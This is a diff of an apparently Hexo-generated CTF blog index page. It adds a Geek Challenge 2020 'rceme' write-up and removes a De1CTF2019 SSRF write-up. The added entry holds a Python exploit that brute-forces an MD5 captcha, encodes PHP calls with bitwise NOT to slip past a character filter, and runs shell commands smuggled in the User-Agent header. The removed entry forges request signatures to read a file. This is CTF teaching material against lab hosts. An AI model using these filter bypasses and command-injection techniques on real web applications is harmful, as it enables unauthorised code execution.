@@ -131,6 +131,55 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/10/10/极客大挑战2020-rceme-wp/" >极客大挑战2020-rceme-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-10-10
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2298">题目链接</a>   </p>
+<p>源码提示有<code>swp</code>，访问<code>.index.php.swp</code>成功下载得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有md5前5位比对校验，且当前<code>$_SESSION[&#39;code&#39;]</code>在页面中也有展现   因此可以爆破   然后就是无参函数构造了</p>
+<blockquote>
+<p>爆破哈希可以查看生日攻击：<a target="_blank" rel="noopener" href="http://ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击 - 阮一峰的网络日志 (ruanyifeng.com)</a></p>
+<p>无参函数构造可见：<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/">https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):		</span><br><span class="line">    ss = <span class="string">b&quot;[~&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += (<span class="number">255</span> - <span class="built_in">ord</span>(each)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ss += <span class="string">b&quot;][~\xCF](&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_not</span>(<span class="params">a</span>):	<span class="comment"># 将命令转为[~\x8F\x8D\x96\x91\x8B\xA0\x8D][~\xCF]();的形式</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">b&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">b&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28583/&#x27;</span></span><br><span class="line">sess = requests.session()	<span class="comment"># 注意这里用session()是为了保持会话状态</span></span><br><span class="line">res = sess.get(url=url)</span><br><span class="line"><span class="built_in">sum</span> = re.findall(<span class="string">&#x27;,0,5[)]==(.....)&#x27;</span>, res.text)[<span class="number">0</span>]	<span class="comment"># 获取5位哈希值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span>	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800000</span>):	<span class="comment"># 爆破  不成功多试几次</span></span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    <span class="keyword">if</span> md5.hexdigest()[:<span class="number">5</span>] == <span class="built_in">sum</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        code = i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;phpinfo();&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功获取到phpinfo结果  渲染后查看  <code>disabled_functions</code>中没有禁用函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; python-requests/2.31.0</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;	<span class="comment"># 这里放要执行的命令</span></span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; ls</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># ls</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls /;cat /fll*&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;system(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># flll1114gggggg ...</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/10/10/极客大挑战2020-rceme-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/10/07/UUCTF2022-ezrce-wp/" >UUCTF2022-ezrce-wp</a>
 								</h3>
 							</div>
@@ -679,56 +728,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" >De1ctf2019 SSRF Me wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-09-08
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>打开页面  得到源码 整理</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip,</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;scan&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&#x27;Connection Timeout&#x27;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;read&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&#x27;Action Error&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Sign Error&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/geneSign&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    action = <span class="string">&#x27;scan&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&#x27;action&#x27;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&#x27;sign&#x27;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No Hacker!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Connection Timeout&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&#x27;gopher&#x27;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
-
-<p>三个路由：</p>
-<ol>
-<li><code>/</code> → 展示源码</li>
-<li><code>/geneSign</code> → 根据<code>param</code>生成数字签名</li>
-<li><code>/De1ta</code> → 在cookie中获取<code>action, sign</code>，并get <code>param</code>（过滤了 gopher 和 file ）  然后新建<code>Task</code>并执行<code>task.Exec</code><ol>
-<li><code>21#</code>根据传入的ip生成沙盒文件夹</li>
-<li><code>29#</code>根据 param 和 action 检查签名是否有效</li>
-<li><code>30#</code>如果 action 中有 <code>scan</code>  则执行 <code>83#</code> ，将结果写入 &#x2F;{sandbox}&#x2F;result.txt </li>
-<li><code>40#</code>如果 action 中有 <code>read</code> 则读取 result.txt 并回显</li>
-</ol>
-</li>
-</ol>
-<h2 id="0x2-攻击方法"><a href="#0x2-攻击方法" class="headerlink" title="0x2 攻击方法"></a>0x2 攻击方法</h2><p>由于<code>86#</code>urllib.urlopen可以以文件名作为参数打开，尝试scan <code>code.txt</code>然后 read</p>
-<p>由于数字签名校验，我们需要先获取sign再向<code>/De1ta</code>发请求    scan方法可以直接通过<code>/geneSign → 63#</code>获取，但是 read 方法不行</p>
-<p>且生成需要<code>secret_key</code>（16个随即字节） 不考虑爆破</p>
-<p>但同时发现<code>30#</code>和<code>40#</code>判断用的是<code>in</code>而不是<code>is</code>  可能有攻击点  尝试拼接  </p>
-<p>很明显  向<code>/De1ta</code>发请求时 <code>action=readscan</code>  这样既会读又会写   向<code>/geneSign</code>请求时只要在param的末尾加上<code>read</code>  这样生成的sign就和<code>53#</code>生成的sign相同  绕过检测</p>
-<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/geneSign&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest + <span class="string">&#x27;read&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url=url, params=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/De1ta&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;readscan&#x27;</span>, <span class="string">&#x27;sign&#x27;</span>: <span class="built_in">str</span>(getSign(dest))&#125;</span><br><span class="line">    res = requests.post(url=url, params=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">get_content(dst)</span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;NSSCTF&#123;cbbd7581-79f0-4636-b907-c45578de18f6&#125;\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/09/08/De1ctf2019-SSRFMe-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -778,7 +777,7 @@
 		
 			<li><a href="/categories/CVE/">CVE<span>12</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>1</span></a></li>
+			<li><a href="/categories/Java/">Java<span>2</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -803,45 +802,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
-		
-			<li><a href="/tags/原型链污染/">原型链污染<span>3</span></a></li>
-		
-			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
-		
-			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
-		
-			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
-		
-			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
-		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>72</span></a></li>
-		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
-		
-			<li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
-		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
-		
-			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
-		
-			<li><a href="/tags/php/">php<span>23</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>6</span></a></li>
-		
-			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
 		
 			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
 		
-			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
+		
+			<li><a href="/tags/jwt/">jwt<span>1</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+		
+			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
+		
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
+		
+			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+		
+			<li><a href="/tags/羊城杯2020/">羊城杯2020<span>1</span></a></li>
+		
+			<li><a href="/tags/upload/">upload<span>4</span></a></li>
+		
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
+		
+			<li><a href="/tags/yaml反序列化/">yaml反序列化<span>1</span></a></li>
+		
+			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+		
+			<li><a href="/tags/XXE/">XXE<span>2</span></a></li>
+		
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+		
+			<li><a href="/tags/seccon2019/">seccon2019<span>1</span></a></li>
+		
